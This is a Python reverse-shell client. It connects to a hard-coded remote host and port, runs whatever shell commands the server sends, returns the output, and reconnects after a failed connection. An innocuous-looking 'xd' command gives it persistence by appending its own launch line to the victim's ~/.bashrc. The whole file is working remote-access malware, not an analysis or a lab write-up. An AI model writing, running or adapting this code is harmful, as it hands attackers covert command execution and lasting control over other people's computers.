import platform
import socket
import os
import subprocess
import sys
import time

SERVER_HOST = "192.168.1.17"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

while True:
    try:
        #CREATION OF SOCKET
        # create the socket object
        s = socket.socket()

        #BINDING OF SOCKET
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))

        #FIRST INTERACTION WITH SERVER
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        #INTERACTION WITH SERVER
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif splited_command[0].lower() == "xd":
                # get the current working directory
                cwd = os.getcwd()
                # create the command to add to .bashrc
                command_to_add = f"python3 {cwd}/client.py &"
                # path to the .bashrc file
                bashrc_path = os.path.expanduser("~/.bashrc")
                try:
                    # open the .bashrc file in append mode
                    with open(bashrc_path, "a") as file:
                        # write the command to the .bashrc file
                        file.write("\n" + command_to_add + "\n")
                    # set the output to success message
                    output = "Command added to .bashrc successfully!"
                except Exception as e:
                    # if there's an error, set the output to the error message
                    output = str(e)
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
        break
    except socket.error:
        print("Socket error, retrying...")
        time.sleep(5)